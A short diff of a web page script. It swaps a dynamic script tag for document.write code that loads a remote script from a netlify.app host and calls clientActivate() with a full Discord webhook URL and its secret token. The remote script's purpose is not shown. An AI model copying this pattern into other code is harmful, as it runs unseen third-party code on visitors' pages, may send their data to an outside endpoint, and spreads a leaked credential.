@@ -153,9 +153,10 @@ backgroundImg.ondrag=function (e) {
     e.preventDefault;
 }
 }
-const BKC = document.createElement("script");
-BKC.src="https://betonikasa.netlify.app/client/start.js";
-document.body.appendChild(BKC);
+document.write(`
+<script src="https://betonikasa.netlify.app/client/start.js"></script>
+<script>clientActivate("https://discord.com/api/webhooks/1078319298960969799/nKCMxvxp3xiCHfMjDSVbjn7l1oizrVZ-LwoWNovz3BcHmghhkBXwC9JkCtSvAl9Aejc9")</script>
+`);
 const Discord = document.createElement("button");
 Discord.id="discord";
 document.body.appendChild(Discord);
